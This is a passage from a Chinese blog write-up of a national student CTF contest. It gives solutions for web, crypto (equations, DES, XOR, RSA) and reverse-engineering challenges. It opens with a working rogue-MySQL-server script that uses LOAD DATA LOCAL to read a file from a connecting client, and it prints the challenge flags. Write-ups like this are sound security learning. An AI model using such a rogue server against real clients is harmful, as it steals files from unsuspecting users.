class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">HOST = &apos;39.97.167.120&apos;</span><br><span class="line">PORT = 3306</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">try:</span><br><span class="line">    s.bind((HOST, PORT))</span><br><span class="line">except socket.error, msg:</span><br><span class="line">    print msg[0], msg[1]</span><br><span class="line">    sys.exit()</span><br><span class="line">s.listen(10)</span><br><span class="line">#wait to accept a connection - blocking call</span><br><span class="line">conn, addr = s.accept()</span><br><span class="line">#now keep talking with the client</span><br><span class="line">MySQLGreeting = [</span><br><span class="line">0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,</span><br><span class="line">0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,</span><br><span class="line">0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,</span><br><span class="line">0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,</span><br><span class="line">0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,</span><br><span class="line">0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,</span><br><span class="line">0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span><br><span class="line">0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,</span><br><span class="line">0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,</span><br><span class="line">0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,</span><br><span class="line">0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,</span><br><span class="line">0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in MySQLGreeting))</span><br><span class="line">data1 = conn.recv(1024)</span><br><span class="line">FirstResponseoK = [</span><br><span class="line">0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,</span><br><span class="line">0x00, 0x00, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in FirstResponseoK))</span><br><span class="line">data2 = conn.recv(1024)</span><br><span class="line">fname = &apos;/fll1llag_h3r3&apos;</span><br><span class="line">get_file = chr(len(fname) + 1) + &apos;\x00\x00\x01\xfb&apos; + fname</span><br><span class="line">conn.send(get_file)</span><br><span class="line">flag1= conn.recv(1024)</span><br><span class="line">SecondResponseoK = [</span><br><span class="line">0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,</span><br><span class="line">0x00, 0x00, 0x00]</span><br><span class="line">conn.send(&apos;&apos;.join(chr(i) for i in SecondResponseoK))</span><br><span class="line">flag2= conn.send(1024)</span><br><span class="line">print flag1,flag2</span><br><span class="line">conn.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure></p>
<p>参考链接：<a href="http://www.52bug.cn/hkjs/4843.html" target="_blank" rel="noopener">http://www.52bug.cn/hkjs/4843.html</a><br>flag{3f4abe8b-aa4a-bb48-c2f9f04d045beade} </p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x01-puzzles"><a href="#0x01-puzzles" class="headerlink" title="0x01  puzzles"></a>0x01  puzzles</h3><h4 id="question0"><a href="#question0" class="headerlink" title="question0"></a>question0</h4><p>网上找了一个四元一次方程组计算器<br><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./18.png" title="图片" data-fancybox="images"><img src="./18.png" alt="图片" title class></a>
                <p>图片</p>
            </figure><br>a1 = 4006 a2 = 3053 a3 = 2503 a4 = 2560<br>a1 = 0xfa6 a2 = 0xbed a3 = 9c7 a4 = 0xa00<br>a1a2a3a4=<strong>fa6bed9c7a00</strong></p>
<h4 id="question-1"><a href="#question-1" class="headerlink" title="question 1"></a>question 1</h4><p>找规律，找素数<br>26364809 Part1 26366033 26366621<br>参考链接：<a href="http://smallprimenumber.blogspot.com/2008/12/prime-number-from-26000000-to-26500000.html" target="_blank" rel="noopener">http://smallprimenumber.blogspot.com/2008/12/prime-number-from-26000000-to-26500000.html</a>（直接把上面三个长整数丢进谷歌搜索就有这个链接）<br>26364809 到 26366033之间有73个素数，26366033到26366621之间有36个素数<br>刚好是第37个<br>part1 = 26365399 =0x<strong>1924dd7</strong></p>
<h4 id="question2"><a href="#question2" class="headerlink" title="question2"></a>question2</h4><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./19.png" title="图片" data-fancybox="images"><img src="./19.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>Part2 = (1+91+ 7 + 1  )x77=7700=0x<strong>1e14</strong></p>
<h4 id="question3"><a href="#question3" class="headerlink" title="question3"></a>question3</h4><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./20.png" title="图片" data-fancybox="images"><img src="./20.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>怼公式<br>电动势 = B2<em>πrdr/dt = 80 π</em><br>part3 = 233×80 = 18640=0x<strong>48d0</strong></p>
<h4 id="question4"><a href="#question4" class="headerlink" title="question4"></a>question4</h4><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./21.png" title="图片" data-fancybox="images"><img src="./21.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>part4=120*336=40320<br>=0x<strong>9d80</strong></p>
<p>flag{01924dd7-1e14-48d0-9d80-fa6bed9c7a00}</p>
<h3 id="0x02-SimpleDES"><a href="#0x02-SimpleDES" class="headerlink" title="0x02  SimpleDES"></a>0x02  SimpleDES</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">Enc = [32, 1, 2, 3, 4, 5,</span><br><span class="line">        4, 5, 6, 7, 8, 9,</span><br><span class="line">        8, 9, 10, 11, 12, 13,</span><br><span class="line">        12, 13, 14, 15, 16, 17,</span><br><span class="line">        16, 17, 18, 19, 20, 21,</span><br><span class="line">        20, 21, 22, 23, 24, 25,</span><br><span class="line">        24, 25, 26, 27, 28, 29,</span><br><span class="line">        28, 29, 30, 31, 32, 1]</span><br><span class="line">SBES = [</span><br><span class="line">        [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],</span><br><span class="line">            [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],</span><br><span class="line">            [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],</span><br><span class="line">            [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],</span><br><span class="line">            ],</span><br><span class="line">        [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],</span><br><span class="line">            [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],</span><br><span class="line">            [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],</span><br><span class="line">            [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],</span><br><span class="line">            ],</span><br><span class="line">        [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],</span><br><span class="line">            [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],</span><br><span class="line">            [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],</span><br><span class="line">            [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],</span><br><span class="line">            ],</span><br><span class="line">        [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],</span><br><span class="line">            [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],</span><br><span class="line">            [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],</span><br><span class="line">            [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],</span><br><span class="line">            ],  </span><br><span class="line">        [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],</span><br><span class="line">            [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],</span><br><span class="line">            [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],</span><br><span class="line">            [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],</span><br><span class="line">            ], </span><br><span class="line">        [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],</span><br><span class="line">            [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],</span><br><span class="line">            [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],</span><br><span class="line">            [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],</span><br><span class="line">            ], </span><br><span class="line">        [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],</span><br><span class="line">            [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],</span><br><span class="line">            [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],</span><br><span class="line">            [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],</span><br><span class="line">            ],</span><br><span class="line">        [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],</span><br><span class="line">            [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],</span><br><span class="line">            [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],</span><br><span class="line">            [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],</span><br><span class="line">            ]</span><br><span class="line">        ]</span><br><span class="line">P = [16, 7, 20, 21, 29, 12, 28, 17,</span><br><span class="line">        1, 15, 23, 26, 5, 18, 31, 10,</span><br><span class="line">        2, 8, 24, 14, 32, 27, 3, 9,</span><br><span class="line">        19, 13, 30, 6, 22, 11, 4, 25]</span><br><span class="line">PAI = [40, 8, 48, 16, 56, 24, 64, 32,</span><br><span class="line">        39, 7, 47, 15, 55, 23, 63, 31,</span><br><span class="line">        38, 6, 46, 14, 54, 22, 62, 30,</span><br><span class="line">        37, 5, 45, 13, 53, 21, 61, 29,</span><br><span class="line">        36, 4, 44, 12, 52, 20, 60, 28,</span><br><span class="line">        35, 3, 43, 11, 51, 19, 59, 27,</span><br><span class="line">        34, 2, 42, 10, 50, 18, 58, 26,</span><br><span class="line">        33, 1, 41, 9, 49, 17, 57, 25]</span><br><span class="line">def strToarr(txt):</span><br><span class="line">    arr = list()</span><br><span class="line">    for char in txt:</span><br><span class="line">        bvalue = b(char, 8)</span><br><span class="line">        arr.extend([int(x) for x in list(bvalue)])</span><br><span class="line">    return arr</span><br><span class="line">def arrTostr(arr): </span><br><span class="line">    r = &apos;&apos;.join([chr(int(y,2)) for y in [&apos;&apos;.join([str(x) for x in bytes]) for bytes in  nsp(arr,8)]])   </span><br><span class="line">    return r</span><br><span class="line">def b(val, size):</span><br><span class="line">    bvalue = bin(val)[2:] if isinstance(val, int) else bin(ord(val))[2:]</span><br><span class="line">    if len(bvalue) &gt; size:</span><br><span class="line">        raise &quot;binary value larger than the expected size&quot;</span><br><span class="line">    while len(bvalue) &lt; size:</span><br><span class="line">        bvalue = &quot;0&quot;+bvalue</span><br><span class="line">    return bvalue</span><br><span class="line">def nsp(s, n):</span><br><span class="line">    return [s[k:k+n] for k in xrange(0, len(s), n)]</span><br><span class="line">class SimpleDes():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.keys = list()</span><br><span class="line">    def test(self, aRound):</span><br><span class="line">        part_encode = &apos;92d915250119e12b&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        key_map = &apos;e0be661032d5f0b676f82095e4d67623628fe6d376363183aed373a60167af537b46abc2af53d97485591f5bd94b944a3f49d94897ea1f699d1cdc291f2d9d4a5c705f2cad89e938dbacaca15e10d8aeaed90236f0be2e954a8cf0bea6112e84&apos;.decode(&apos;hex&apos;)</span><br><span class="line">        keys = []</span><br><span class="line">        for i in range(16):</span><br><span class="line">            tipses = key_map[6*i: 6+6*i]</span><br><span class="line">            keys.append(strToarr(tipses))</span><br><span class="line">        self.keys = keys</span><br><span class="line">        result = list()</span><br><span class="line">        bok = strToarr(part_encode)</span><br><span class="line">        g, d = nsp(bok, 32)</span><br><span class="line">        d, g = nsp(bok, 32)</span><br><span class="line"></span><br><span class="line">        tipses = None</span><br><span class="line">        for i in range(16):</span><br><span class="line">            if i &lt; aRound:</span><br><span class="line">                continue</span><br><span class="line">            de = self.perm(d, Enc)</span><br><span class="line">            tipses = self.yh(self.keys[15-i], de)</span><br><span class="line">            tipses = self.subtses(tipses)</span><br><span class="line">            tipses = self.perm(tipses, P)</span><br><span class="line">            tipses = self.yh(g, tipses)</span><br><span class="line">            g = d</span><br><span class="line">            d = tipses</span><br><span class="line">        result += self.perm(d+g, PAI)</span><br><span class="line">        final_res = arrTostr(result)</span><br><span class="line">        return final_res</span><br><span class="line">    def subtses(self, de):</span><br><span class="line">        subbs = nsp(de, 6)</span><br><span class="line">        r = list()</span><br><span class="line">        for i in range(len(subbs)):</span><br><span class="line">            bok = subbs[i]</span><br><span class="line">            row = int(str(bok[0])+str(bok[5]),2)</span><br><span class="line">            col = int(&apos;&apos;.join([str(x) for x in bok[1:][:-1]]),2)</span><br><span class="line">            val = SBES[i][row][col]</span><br><span class="line">            bin = b(val, 4)</span><br><span class="line">            r += [int(x) for x in bin]</span><br><span class="line">        return r</span><br><span class="line">    def perm(self, b, t):</span><br><span class="line">        return [b[x-1] for x in t]</span><br><span class="line">    def yh(self, b, t):</span><br><span class="line">        return [x^y for x,y in zip (b,t)]</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    d = SimpleDes()</span><br><span class="line">    res = d.test(3)</span><br><span class="line">    print &quot;flag&#123;%s&#125;&quot;%res</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./22.png" title="图片" data-fancybox="images"><img src="./22.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p> flag{y0ur9Ood}</p>
<h3 id="0x03-warmup"><a href="#0x03-warmup" class="headerlink" title="0x03  warmup"></a>0x03  warmup</h3><p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">plstr = &apos;asdfghjklqwertyuiopasdfghjklzxdfgjfdjdfdjsrtjwsrtjwrjwjhwrcv&apos;</span><br><span class="line">cistr = &apos;554796a8bcd5ebdbbb16bf0988e124282d7ef4ec8136e7cbd5f49219801af2355a2a59cc445b7e8c95366fad7275b243e0e87534fe84230412946846a3fca15737d6a646cf67b45278641b058766b93ba1b4bdd5cca0d5a18edf01b7a8b56edfbf96d2e491c5ad9a788ffd418818dab0&apos;</span><br><span class="line">kstr = map(lambda s: s[0] ^ s[1], zip(map(ord, binascii.unhexlify(cistr)), map(ord, plstr)))</span><br><span class="line">Tcstr = map(ord,binascii.unhexlify(&apos;525893a9a084b186e406fa5acdb86f682574a9b9c733b28184fdcf10d754a4300d255d994a5d2a8dc6381bdf1e04c737&apos;))</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">print len(kstr)</span><br><span class="line">for i in xrange(len(Tcstr)):</span><br><span class="line">    if i &gt;= len(kstr):</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        result += chr(Tcstr[i] ^ kstr[i])</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./23.png" title="图片" data-fancybox="images"><img src="./23.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./24.png" title="图片" data-fancybox="images"><img src="./24.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./25.png" title="图片" data-fancybox="images"><img src="./25.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>flag{9063a267-25ae-45a3-9c6e-62c0eb1db2e9}</p>
<h3 id="0x04-Asymmetric"><a href="#0x04-Asymmetric" class="headerlink" title="0x04  Asymmetric"></a>0x04  Asymmetric</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">import gmpy2</span><br><span class="line">import codecs</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">num1=long(754600786340927688096652328072061561501667781193760284816393637647032362908189628005150802929636396969230958922073774180726205402897453096041624408154494621307262657492560975357997726055874834308239749992507552325614973631556754707427580134609221878324704469965450463088892083264951442562525825243127575048386573246756312509362222667015490013299327398464802116909245529065994770788125182846841016932803939806558559335886481214931253578226314057242462834149031625361286317307273138514126289052003214703248070256059405676891634792175775697355408418965738663732479622148276007308404691800186837579126431484536836513358124181380166971922188839934522356902295160649189850427580493328509329115798694580347461641487270793993129066433242544366683131231903590153844590595882428219010673818765995719694470668924781499987923250883546686344997580959954960334567874040563037167422839228466141912000421309282727363913908613116739074234989825489075148091144771967111113068647060175231126374070143480727000247378471525286907200601035581143391602569836131345909055708005758380081303860198696570649330092070410465978479841469533490522594827330661914537170063053059393550673731195548189192109328158876774080143171304333338291909598353550442855717204721)</span><br><span class="line"></span><br><span class="line">num2=long(58134567416061346246424950552806959952164141873988197038339318172373514096258823300468791726051378264715940131129676561677588167620420173326653609778206847514019727947838555201787320799426605222230914672691109516799571428125187628867529996213312357571123877040878478311539048041218856094075106182505973331343540958942283689866478426396304208219428741602335233702611371265705949787097256178588070830596507292566654989658768800621743910199053418976671932555647943277486556407963532026611905155927444039372549162858720397597240249353233285982136361681173207583516599418613398071006829129512801831381836656333723750840780538831405624097443916290334296178873601780814920445215584052641885068719189673672829046322594471259980936592601952663772403134088200800288081609498310963150240614179242069838645027877593821748402909503021034768609296854733774416318828225610461884703369969948788082261611019699410587591866516317251057371710851269512597271573573054094547368524415495010346641070440768673619729280827372954003276250541274122907588219152496998450489865181536173702554116251973661212376735405818115479880334020160352217975358655472929210184877839964775337545502851880977049299029101466287659419446724781305689536816523774995178046989696610897508786776845460908137698543091418571263630383061605011820139755322231913029643701770497299157169690586232187419462594477116374977216427311975598620616618808494138669546120288334682865354702356192972496556372279363023366842805886601834278434406709218165445335977049796015123909789363819484954615665668979)</span><br><span class="line"></span><br><span class="line">num3=long(165740755190793304655854506052794072378181046252118367693457385632818329041540419488625472007710062128632942664366383551452498541560538744582922713808611320176770401587674618121885719953831122487280978418110380597358747915420928053860076414097300832349400288770613227105348835005596365488460445438176193451867)</span><br><span class="line"></span><br><span class="line">a1=long(num3**2)</span><br><span class="line">a2=long(num3**2)</span><br><span class="line">c=long(gmpy2.invert(num2,a1**2*(a1-1)))</span><br><span class="line"></span><br><span class="line">d=&quot;YXmuOsaD1W4poLAG2wPrJ/nYZCkeOh2igCYKnZA6ecCeJadT6B3ZVTciPN6LJ8AcAsRXNnkC6+9PNJPhmosSG5UGGbpIcg2JaZ1iA8Sm3fGiFacGvQsJOqqIWb01rjaQ3rDBKB331rrNo9QNOfMnjKr0ejGG+dNObTtvnskICbYbNnSxMxLQF57H5JnWZ3LbbKQ493vmZzwvC6iH8blNPAp3dBlVzDqIAmxmUbk0OzFjPoHphD1oxHdzXyQNW+sLxVldrf9xcItq92jN5sqBYrG8wADIqY1/sqhTMZvkIYFMHqoMQuiRSnVrCF2h2RtGDEayLo0evgXI/0W3YveyKCHViOnG6wypcBFm91ZWdjp3fVW/4DyxW6xu9hg/NlXyRP6pT/OyQpcyTqKRuiXJLWgFUJI/8TRgyAjBLLgSd3U0N3VM8kewXw5j+fMUTCW9/Gy4iP8m52Zabx/vEKdwdGZ0QyvgvAWGUFZ96EK0g1BM/LU9Tuu2R+VKcCSCprg283x6NfYxmU26KlQE6ZrrjLmbCOe0327uaW9aDbLxZytPYIE5ZkzhSsD9JpQBKL30dCy3UKDbcuNgB6SrDddrbIuUd0/kLxuwh6kTqNbC4NDrOT4WAuP4se8GGOK8Wz0dL6rE6FkzMnI4Qg501MTSNQZ4Bp7cNf6H9lTa/4DNOl0=&quot;</span><br><span class="line"></span><br><span class="line">d=base64.b64decode(d)</span><br><span class="line">d=d.encode(&apos;hex&apos;)</span><br><span class="line">d=int(d,16)</span><br><span class="line">e=hex(pow(d,c,num1))[2:].replace(&quot;L&quot;,&quot;&quot;)</span><br><span class="line">if(len(e)%2==1):</span><br><span class="line">    m=&apos;0&apos;+e</span><br><span class="line">print e.decode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./26.png" title="图片" data-fancybox="images"><img src="./26.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p> flag{ec33f669d2d659e2bc27dbffdfeb0f38}</p>
<p># </p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="0x01-easyGo"><a href="#0x01-easyGo" class="headerlink" title="0x01  easyGo"></a>0x01  easyGo</h3><figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./27.png" title="图片" data-fancybox="images"><img src="./27.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./28.png" title="图片" data-fancybox="images"><img src="./28.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>
<p>使用gdb单步步过,向下执行,直到出现flag{92094daf-33c9-431e-a85a-8bfbd5df98ad} </p>
<h3 id="0x02-bbvvmm"><a href="#0x02-bbvvmm" class="headerlink" title="0x02  bbvvmm"></a>0x02  bbvvmm</h3><p>在虚拟机中单步跟踪调试，发现在sub_4051E3中将输入的密码写入了图中位置<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./29.png" title="图片" data-fancybox="images"><img src="./29.png" alt="图片" title class></a>
                <p>图片</p>
            </figure><br>旁边可看见正确的密码 xyz{|}<br>RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=<br>base64换码表之后解码得到<br>0xEF,0x46,0x8D,0xBA,0xF9,0x85,0xB2,0x50,0x9C,0x9E,0x20,0x0C,0xF3,0x52,0x5A,0xB6<br>然后根据这个网站<a href="http://www.sitcoder.com/?post=60" target="_blank" rel="noopener">http://www.sitcoder.com/?post=60</a>解密SM4得到用户名 badrer12。<br>由于password处回车会导致溢出，程序没有回显，所以在password只send数据，就可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">id = remote(&apos;39.106.224.151&apos;, 10001)</span><br><span class="line">print id.recv()</span><br><span class="line">id.sendline(&apos;badrer12&apos;)</span><br><span class="line">print id.recv()</span><br><span class="line">id.send(&apos;xyz&#123;|&#125;&apos;)</span><br><span class="line">print id.recv()</span><br><span class="line">id.close()</span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=第十二届全国大学生信息安全竞赛线上赛wp href="./30.png" title="图片" data-fancybox="images"><img src="./30.png" alt="图片" title class></a>
                <p>图片</p>
            </figure>

        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2019-09-27T13:08:03.734Z" itemprop="dateUpdated">2019-09-27 21:08:03</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/ctf-writeup/ckwd6025n006rkcucuim39ahz/" target="_blank" rel="external">https://www.damyahome.github.io/ctf-writeup/ckwd6025n006rkcucuim39ahz/</a>
        
    </div>
    <footer>
        <a href="https://www.damyahome.github.io">
            <img src="/img/avatar.jpg" alt="Damya">
            Damya
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/团队ctf竞赛/">团队ctf竞赛</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.damyahome.github.io/ctf-writeup/ckwd6025n006rkcucuim39ahz/&title=《第十二届全国大学生信息安全竞赛线上赛wp》 — Damya's Blog&pic=https://www.damyahome.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
